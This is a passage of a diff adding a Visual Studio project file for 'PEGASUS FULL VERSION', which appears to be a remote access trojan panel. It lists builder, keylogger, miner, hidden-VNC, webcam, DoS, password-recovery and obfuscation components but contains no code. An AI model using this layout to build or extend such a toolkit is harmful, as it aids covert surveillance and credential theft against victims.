@@ -1,0 +1,1329 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{836E495F-E1AF-498C-B2B2-80C5995F9FE9}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>
+    </RootNamespace>
+    <AssemblyName>PEGASUS FULL VERSION</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <langversion>9</langversion>
+    <FileAlignment>512</FileAlignment>
+    <ProjectTypeGuids>{60DC8134-EBA5-43B8-BCC9-BB4BC16C2548};{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}</ProjectTypeGuids>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>PEGASUS FULL VERSION.ico</ApplicationIcon>
+    <StartupObject>PEGASUS.Program</StartupObject>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>0</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>0</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="AntiRE.Runtime">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\AntiRE.Runtime.dll</HintPath>
+    </Reference>
+    <Reference Include="BouncyCastle.Crypto">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\BouncyCastle.Crypto.dll</HintPath>
+    </Reference>
+    <Reference Include="Bunifu.UI.WinForms.1.5.3">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Bunifu.UI.WinForms.1.5.3.dll</HintPath>
+    </Reference>
+    <Reference Include="Bunifu.UI.WinForms.BunifuLabel">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Bunifu.UI.WinForms.BunifuLabel.dll</HintPath>
+    </Reference>
+    <Reference Include="Bunifu.UI.WinForms.BunifuSeparator">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Bunifu.UI.WinForms.BunifuSeparator.dll</HintPath>
+    </Reference>
+    <Reference Include="Bunifu.UI.WinForms.BunifuTransition">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Bunifu.UI.WinForms.BunifuTransition.dll</HintPath>
+    </Reference>
+    <Reference Include="cGeoIp">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\cGeoIp.dll</HintPath>
+    </Reference>
+    <Reference Include="Discord.Net.Core">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Discord.Net.Core.dll</HintPath>
+    </Reference>
+    <Reference Include="Discord.Net.Rest">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Discord.Net.Rest.dll</HintPath>
+    </Reference>
+    <Reference Include="Discord.Net.WebSocket">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Discord.Net.WebSocket.dll</HintPath>
+    </Reference>
+    <Reference Include="dnlib">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\dnlib.dll</HintPath>
+    </Reference>
+    <Reference Include="Guna.UI2">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Guna.UI2.dll</HintPath>
+    </Reference>
+    <Reference Include="IconExtractor">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\IconExtractor.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Mono.Nat, Version=3.0.0.0, Culture=neutral, PublicKeyToken=6c9468a3c21bc6d1, processorArchitecture=MSIL">
+      <HintPath>..\packages\Mono.Nat.3.0.2\lib\netstandard2.0\Mono.Nat.dll</HintPath>
+    </Reference>
+    <Reference Include="Newtonsoft.Json">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="PresentationFramework" />
+    <Reference Include="protobuf-net, Version=3.0.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67, processorArchitecture=MSIL">
+      <HintPath>..\packages\protobuf-net.3.0.101\lib\net461\protobuf-net.dll</HintPath>
+    </Reference>
+    <Reference Include="Server">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Server.dll</HintPath>
+    </Reference>
+    <Reference Include="SharpUpdate">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\SharpUpdate.dll</HintPath>
+    </Reference>
+    <Reference Include="Siticone.UI">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Siticone.UI.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Buffers.4.5.1\lib\net461\System.Buffers.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Core">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\System.Core.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Diagnostics.DiagnosticSource, Version=5.0.0.1, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL" />
+    <Reference Include="System.DirectoryServices" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Memory, Version=4.0.1.1, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Memory.4.5.4\lib\net461\System.Memory.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Numerics.Vectors.4.5.0\lib\net46\System.Numerics.Vectors.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.CompilerServices.Unsafe, Version=4.0.4.1, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.CompilerServices.Unsafe.4.5.3\lib\net461\System.Runtime.CompilerServices.Unsafe.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Web" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="Vestris.ResourceLib">
+      <HintPath>..\..\..\..\Dumps\SourceExtractReady\Vestris.ResourceLib.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Module.cs" />
+    <Compile Include="PrivateImplementationDetails.cs" />
+    <Compile Include="AnimateMsgBox.cs" />
+    <Compile Include="Costura\AssemblyLoader.cs" />
+    <Compile Include="custom_alert_notifications\alert.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="custom_alert_notifications\alert.Designer.cs">
+      <DependentUpon>alert.cs</DependentUpon>
+    </Compile>
+    <Compile Include="InputDialog.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="InputDialog.Designer.cs">
+      <DependentUpon>InputDialog.cs</DependentUpon>
+    </Compile>
+    <Compile Include="love.cs" />
+    <Compile Include="LoyalListView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="LoyalListViewColumnHeader.cs" />
+    <Compile Include="LoyalListViewItem.cs" />
+    <Compile Include="LoyalListViewSubItem.cs" />
+    <Compile Include="LoyalScrollBar.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="MsgBox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MsgBox.Designer.cs">
+      <DependentUpon>MsgBox.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\Algorithm\AES.cs" />
+    <Compile Include="PEGASUS\Algorithm\Aes256.cs" />
+    <Compile Include="PEGASUS\Algorithm\CryptographyHelper.cs" />
+    <Compile Include="PEGASUS\Algorithm\GetHash.cs" />
+    <Compile Include="PEGASUS\Algorithm\GZip.cs" />
+    <Compile Include="PEGASUS\Algorithm\Serializable.cs" />
+    <Compile Include="PEGASUS\Algorithm\Sha256.cs" />
+    <Compile Include="PEGASUS\Algorithm\UBinder.cs" />
+    <Compile Include="PEGASUS\Algorithm\Zip.cs" />
+    <Compile Include="PEGASUS\AnimateMsgBox.cs" />
+    <Compile Include="PEGASUS\Connection\Clients.cs" />
+    <Compile Include="PEGASUS\Connection\Listener.cs" />
+    <Compile Include="PEGASUS\DowSettings.cs" />
+    <Compile Include="PEGASUS\EmlSettings.cs" />
+    <Compile Include="PEGASUS\FormSendFileToMemory.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\FormSendFileToMemory.Designer.cs">
+      <DependentUpon>FormSendFileToMemory.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\AnimateMsgBox.cs" />
+    <Compile Include="PEGASUS\Forms\CustomControls\IRapidPictureBox.cs" />
+    <Compile Include="PEGASUS\Forms\CustomControls\RapidPictureBox.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\CustomControls\TabControlEx.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormAbout.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormAbout.Designer.cs">
+      <DependentUpon>FormAbout.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormAudio.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormAudio.Designer.cs">
+      <DependentUpon>FormAudio.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormBlockClients.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormBlockClients.Designer.cs">
+      <DependentUpon>FormBlockClients.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormBuilder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormBuilder.Designer.cs">
+      <DependentUpon>FormBuilder.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormCertificate.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormCertificate.Designer.cs">
+      <DependentUpon>FormCertificate.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormChat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormChat.Designer.cs">
+      <DependentUpon>FormChat.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormDOS.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormDownloadFile.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormFileManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormFileSearcher.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormFun.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormKeylogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormMiner.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormNetstat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormPorts.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormPowerShell.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormProcessManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormRegistryEditor.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormRegValueEditBinary.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormRegValueEditMultiString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormRegValueEditString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormRegValueEditWord.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormRemoteDesktop.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormSetting.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormShell.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FormWebcam.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FrmAngry.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FrmCSPM.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FrmDiscordST3.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FrmEmailer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FrmInfo.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FrmNoStub.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FrmReco.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FrmSkynet.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\FrmWebHookSPM.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\Login.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\MsgBox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\PEGASUSMain.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\Register.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\Remote_Desktop.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\Remote_hVNC.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Classes\Base64.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Classes\ClassesRenaming.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Classes\DecryptionHelper.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Classes\FieldsRenaming.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Classes\InjectHelper.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Classes\MethodsRenaming.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Classes\NamespacesRenaming.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Classes\PropertiesRenaming.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Classes\Utils.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\EncryptString.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Interfaces\ICrypto.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Interfaces\IRenaming.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\AddInteger.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\AntiDe4Dot.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\CFHelper.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Ovelkill.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Protections\ControlFlow.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Protections\CryptoRandom.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Protections\IntEncoding.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Protections\L2F.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Protections\Renamer.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Protections\StringEncryption.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\ProxyInts.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Utils\Analyzer\DefAnalyzer.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Utils\Analyzer\EventDefAnalyzer.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Utils\Analyzer\FieldDefAnalyzer.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Utils\Analyzer\MethodDefAnalyzer.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Utils\Analyzer\ParameterAnalyzer.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Utils\Analyzer\PropertyDefAnalyzer.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Utils\InjectContext.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Utils\InjectHelper.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Utils\MemberRenamer.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Utils\Randomizer.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Overkill\Utils\StringDecoder.cs" />
+    <Compile Include="PEGASUS\Forms\RenamingObfuscation\Renaming.cs" />
+    <Compile Include="PEGASUS\Forms\Splashes.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Forms\Welcome.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\FrmSplash.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\FrmSplash.Designer.cs">
+      <DependentUpon>FrmSplash.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\Handle_Packet\HandleAudio.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleChat.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleDos.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleFileManager.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleFileSearcher.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleFun.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandlehRDP.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleInformation.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleKeylogger.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleListView.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleLogs.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleNetstat.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandlePassword.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandlePing.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandlePowerShell.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleProcessManager.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleRecovery.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleRegManager.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleRemoteDesktop.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleReportWindow.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleShell.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleSkynet.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleThumbnails.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\HandleWebcam.cs" />
+    <Compile Include="PEGASUS\Handle_Packet\Packet.cs" />
+    <Compile Include="PEGASUS\Helper\AeroListView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Helper\AsyncTask.cs" />
+    <Compile Include="PEGASUS\Helper\ByteConverter.cs" />
+    <Compile Include="PEGASUS\Helper\CreateCertificate.cs" />
+    <Compile Include="PEGASUS\Helper\DingDing.cs" />
+    <Compile Include="PEGASUS\Helper\HexEditor\ByteCollection.cs" />
+    <Compile Include="PEGASUS\Helper\HexEditor\Caret.cs" />
+    <Compile Include="PEGASUS\Helper\HexEditor\EditView.cs" />
+    <Compile Include="PEGASUS\Helper\HexEditor\HexEditor.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Helper\HexEditor\HexViewHandler.cs" />
+    <Compile Include="PEGASUS\Helper\HexEditor\IKeyMouseEventHandler.cs" />
+    <Compile Include="PEGASUS\Helper\HexEditor\StringViewHandler.cs" />
+    <Compile Include="PEGASUS\Helper\IconInjector.cs" />
+    <Compile Include="PEGASUS\Helper\ListViewColumnSorter.cs" />
+    <Compile Include="PEGASUS\Helper\ListviewDoubleBuffer.cs" />
+    <Compile Include="PEGASUS\Helper\LoopUtilities.cs" />
+    <Compile Include="PEGASUS\Helper\Methods.cs" />
+    <Compile Include="PEGASUS\Helper\NativeMethods.cs" />
+    <Compile Include="PEGASUS\Helper\ReferenceLoader.cs" />
+    <Compile Include="PEGASUS\Helper\RegistryKeyExtensions.cs" />
+    <Compile Include="PEGASUS\Helper\RegistryKeyHelper.cs" />
+    <Compile Include="PEGASUS\Helper\RegistrySeeker.cs" />
+    <Compile Include="PEGASUS\Helper\RegistryTreeView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Helper\RegistryValueLstItem.cs" />
+    <Compile Include="PEGASUS\Helper\RegValueHelper.cs" />
+    <Compile Include="PEGASUS\Helper\WordTextBox.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\Loader\Config.cs" />
+    <Compile Include="PEGASUS\Loader\Extensions.cs" />
+    <Compile Include="PEGASUS\Loader\LoaderConfig.cs" />
+    <Compile Include="PEGASUS\Loader\ReplacementAttribute.cs" />
+    <Compile Include="PEGASUS\Loader\SourceBuilder.cs" />
+    <Compile Include="PEGASUS\MessagePack\BytesTools.cs" />
+    <Compile Include="PEGASUS\MessagePack\MsgPack.cs" />
+    <Compile Include="PEGASUS\MessagePack\MsgPackArray.cs" />
+    <Compile Include="PEGASUS\MessagePack\MsgPackEnum.cs" />
+    <Compile Include="PEGASUS\MessagePack\MsgPackType.cs" />
+    <Compile Include="PEGASUS\MessagePack\ReadTools.cs" />
+    <Compile Include="PEGASUS\MessagePack\WriteTools.cs" />
+    <Compile Include="PEGASUS\Messages\GetCilentInfo.cs" />
+    <Compile Include="PEGASUS\Messages\RemoteFilesList.cs" />
+    <Compile Include="PEGASUS\Messages\RemoteWebList.cs" />
+    <Compile Include="PEGASUS\Module\ClientInfomation.cs" />
+    <Compile Include="PEGASUS\MsgBox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\MsgBox.Designer.cs">
+      <DependentUpon>MsgBox.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\Pegasus\ABC.cs" />
+    <Compile Include="PEGASUS\Pegasus\api.cs" />
+    <Compile Include="PEGASUS\Pegasus\App.cs" />
+    <Compile Include="PEGASUS\Pegasus\ApplicationSettings.cs" />
+    <Compile Include="PEGASUS\Pegasus\BYTEPI.cs" />
+    <Compile Include="PEGASUS\Pegasus\Constants.cs" />
+    <Compile Include="PEGASUS\Pegasus\DAPI.cs" />
+    <Compile Include="PEGASUS\Pegasus\defender.cs" />
+    <Compile Include="PEGASUS\Pegasus\Encryption.cs" />
+    <Compile Include="PEGASUS\Pegasus\InfoManager.cs" />
+    <Compile Include="PEGASUS\Pegasus\json_wrapper.cs" />
+    <Compile Include="PEGASUS\Pegasus\Security.cs" />
+    <Compile Include="PEGASUS\Pegasus\User.cs" />
+    <Compile Include="PEGASUS\Program.cs" />
+    <Compile Include="PEGASUS\Properties\Resources.cs" />
+    <Compile Include="Properties\Settings.Designer.cs">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="PEGASUS\RhVNC_Connections.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\RhVNC_Connections.Designer.cs">
+      <DependentUpon>RhVNC_Connections.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\Settings.cs" />
+    <Compile Include="PEGASUS\Sockets\RemoteHVNCServer.cs" />
+    <Compile Include="PEGASUS\TCP\IAsyncEventDispatcher.cs" />
+    <Compile Include="PEGASUS\TCP\TcpHeartPacket.cs" />
+    <Compile Include="PEGASUS\Tools\Algorithm\AES.cs" />
+    <Compile Include="PEGASUS\Tools\Algorithm\Aes256.cs" />
+    <Compile Include="PEGASUS\Tools\Algorithm\GZip.cs" />
+    <Compile Include="PEGASUS\Tools\Algorithm\Serializable.cs" />
+    <Compile Include="PEGASUS\Tools\Algorithm\Sha256.cs" />
+    <Compile Include="PEGASUS\Tools\Algorithm\UBinder.cs" />
+    <Compile Include="PEGASUS\Tools\Builder\HvncBuilder.cs" />
+    <Compile Include="PEGASUS\Tools\Commands\CommandHandler.cs" />
+    <Compile Include="PEGASUS\Tools\Compression\JpgCompression.cs" />
+    <Compile Include="PEGASUS\Tools\Compression\SafeQuickLZ.cs" />
+    <Compile Include="PEGASUS\Tools\DataType.cs" />
+    <Compile Include="PEGASUS\Tools\Enum\MouseAction.cs" />
+    <Compile Include="PEGASUS\Tools\Helpers\ListViewExtensions.cs" />
+    <Compile Include="PEGASUS\Tools\Helper\CryptographyHelper.cs" />
+    <Compile Include="PEGASUS\Tools\Helper\FileHelper.cs" />
+    <Compile Include="PEGASUS\Tools\Helper\PlatformHelper.cs" />
+    <Compile Include="PEGASUS\Tools\Helper\WindowHelper.cs" />
+    <Compile Include="PEGASUS\Tools\JpgCompression.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Hook.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\IKeyboardEvents.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\IKeyboardMouseEvents.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\IMouseEvents.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\AppEventFacade.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\AppKeyListener.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\AppMouseListener.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\BaseListener.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\ButtonSet.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\Callback.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\EventFacade.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\GlobalEventFacade.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\GlobalKeyListener.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\GlobalMouseListener.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\KeyboardState.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\KeyListener.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\MouseListener.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\Implementation\Subscribe.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\KeyEventArgsExt.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\KeyPressEventArgsExt.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\MouseEventExtArgs.cs" />
